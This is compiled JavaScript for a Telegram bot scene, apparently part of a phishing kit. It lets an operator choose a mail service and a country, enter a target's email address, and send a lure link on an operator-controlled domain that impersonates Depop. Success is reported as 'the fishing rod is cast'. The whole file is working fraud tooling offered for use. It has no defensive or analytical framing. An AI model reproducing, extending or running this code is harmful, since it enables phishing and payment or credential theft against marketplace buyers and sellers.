"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.composer = exports.scene = void 0;
const grammy_scenes_1 = require("grammy-scenes");
const grammy_1 = require("grammy");
const database_1 = require("../../../database");
const deleteAllMessages_1 = require("../../../helpers/deleteAllMessages");
const email_1 = require("../../../utils/rassilka/email");
const getDomen_1 = require("../../../helpers/getDomen");
exports.scene = new grammy_scenes_1.Scene('emailSendDepop');
exports.composer = new grammy_1.Composer();
const regex = /email ad depop (?<id>\d+)/gmi;
exports.composer.callbackQuery(regex, handler);
async function handler(ctx) {
    const match = regex.exec(ctx.callbackQuery.data);
    const id = match.groups.id;
    await ctx.scenes.enter('emailSendDepop', {
        id
    });
}
async function cancel(ctx) {
    await (0, deleteAllMessages_1.deleteAllMessages)(ctx.session.deleteMessage, ctx);
    ctx.scene.exit();
}
exports.scene.always().callbackQuery('cancel emailSendDepop', cancel);
exports.scene.do(async (ctx) => {
    ctx.session.smsEmail = { ad: Number(ctx.scene.opts.arg.id), to: undefined, pattern: undefined };
    const ad = await database_1.adsRepository.findOne({
        where: {
            id: ctx.session.smsEmail.ad
        }
    });
    if (!ad) {
        await ctx.reply(`ad undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Закрыть', callback_data: 'deleteThisMessage' }]
                ]
            }
        });
        return cancel(ctx);
    }
    const msg = await ctx.reply("<b>🌳 Выбери мейлера:</b>", {
        reply_markup: new grammy_1.InlineKeyboard()
            .text('KeshMail', 'keshmail')
            .row()
            .text('YourMailer', 'yourmailer')
            .row()
            .text('Отмена', 'cancel emailSendDepop')
    });
    ctx.session.deleteMessage = [msg.message_id];
    ctx.scene.resume();
});
exports.scene.wait().callbackQuery(/keshmail|yourmailer/, async (ctx) => {
    ctx.session.smsEmail.who = ctx.callbackQuery.data;
    try {
        ctx.deleteMessage();
    }
    catch (e) { }
    if (ctx.callbackQuery.data === 'depa') {
        if (ctx.user.email <= 0) {
            return ctx.answerCallbackQuery({
                show_alert: true,
                text: `🐨 [DEPA] У тебя доступно 0 сообщений`
            });
        }
    }
    const ad = await database_1.adsRepository.findOne({
        where: {
            id: ctx.session.smsEmail.ad
        }
    });
    if (!ad) {
        await ctx.reply(`ad undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Закрыть', callback_data: 'deleteThisMessage' }]
                ]
            }
        });
        return cancel(ctx);
    }
    const msg = await ctx.reply("<b>🪤 Выбери страну:</b>", {
        reply_markup: new grammy_1.InlineKeyboard()
            .text('🇩🇪 Германия', 'de')
            .row()
            .text('🇬🇧 Великобритания', 'gb')
            .row()
            .text('🇦🇺 Австралия', 'au')
            .row()
            .text('Отмена', 'cancel emailSendDepop')
    });
    //
    ctx.session.deleteMessage = [];
    ctx.session.deleteMessage.push(msg.message_id);
    ctx.scene.resume();
});
exports.scene.wait().on('callback_query:data', async (ctx) => {
    ctx.session.smsEmail.country = ctx.callbackQuery.data;
    try {
        ctx.deleteMessage();
    }
    catch (e) { }
    const ad = await database_1.adsRepository.findOne({
        where: {
            id: ctx.session.smsEmail.ad
        }
    });
    if (!ad) {
        await ctx.reply(`ad undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Закрыть', callback_data: 'deleteThisMessage' }]
                ]
            }
        });
        return cancel(ctx);
    }
    const msg = await ctx.reply("<b>📨 Введи e-mail:</b>", {
        reply_markup: new grammy_1.InlineKeyboard()
            .text('Отмена', 'cancel emailSendFacebook')
    });
    ctx.session.deleteMessage = [];
    ctx.session.deleteMessage.push(msg.message_id);
    ctx.scene.resume();
});
exports.scene.wait().on('message:text', async (ctx) => {
    ctx.session.smsEmail.to = ctx.msg.text;
    ctx.session.deleteMessage.push(ctx.msg.message_id);
    const owenerAd = await database_1.adsRepository.findOne({
        where: {
            id: ctx.session.smsEmail.ad
        }
    });
    const ad = await database_1.adsRepository.findOne({
        where: {
            originallink: owenerAd.originallink,
            country: ctx.session.smsEmail.country
        }
    });
    if (!ad) {
        await ctx.reply(`ad undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Закрыть', callback_data: 'deleteThisMessage' }]
                ]
            }
        });
        return cancel(ctx);
    }
    if (ad.service.toLowerCase() === 'depop')
        ctx.session.smsEmail.pattern = "depop_EU@!!@2.0";
    const domen = await (0, getDomen_1.getDomen)(ctx.user, ad.service);
    if (!domen) {
        await ctx.reply(`domen undefined`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Закрыть', callback_data: 'deleteThisMessage' }]
                ]
            }
        });
        return cancel(ctx);
    }
    const msg = await ctx.reply(`⏳`);
    if (ctx.session.smsEmail.who === 'yourmailer') {
        const response = await (0, email_1.sendEmailYourMailer)(ctx.session.smsEmail.to, ctx.session.smsEmail.pattern, `https://${domen.link}/service/depop/${ad.link}?email=${ctx.session.smsEmail.to}&emailowner=${ctx.session.smsEmail.who}`, ctx.from.id);
        try {
            ctx.api.deleteMessage(ctx.chat.id, msg.message_id);
        }
        catch (e) { }
        console.log(response, 'yourmailer');
        await ctx.reply((response === "The message has been sent")
            ? `✅ Удочка закинута`
            : `⚠️ Не удалось отправить письмо`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Закрыть', callback_data: 'deleteThisMessage' }]
                ]
            }
        });
    }
    else if (ctx.session.smsEmail.who === 'keshmail') {
        let service = undefined;
        if (ctx.session.smsEmail.service === 'depop' && ctx.session.smsEmail.country === 'de')
            ctx.session.smsEmail.pattern = "depop.de";
        if (ctx.session.smsEmail.service === 'depop' && ctx.session.smsEmail.country === 'gb')
            ctx.session.smsEmail.pattern = "depop.co.uk";
        const response = await (0, email_1.sendEmailKeshMail)(String(ctx.from.id), String((ctx.from?.username) ? ctx.from?.username : 'none'), ctx.session.smsEmail.to, `https://${domen.link}/link/${ad.link}?email=${ctx.session.smsEmail.to}&emailowner=${ctx.session.smsEmail.who}`, service, ad.date);
        try {
            ctx.api.deleteMessage(ctx.chat.id, msg.message_id);
        }
        catch (e) { }
        console.log(response, 'keshmail');
        await ctx.reply((response)
            ? `✅ Удочка закинута`
            : `⚠️ Не удалось отправить письмо`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Закрыть', callback_data: 'deleteThisMessage' }]
                ]
            }
        });
    }
    return cancel(ctx);
});
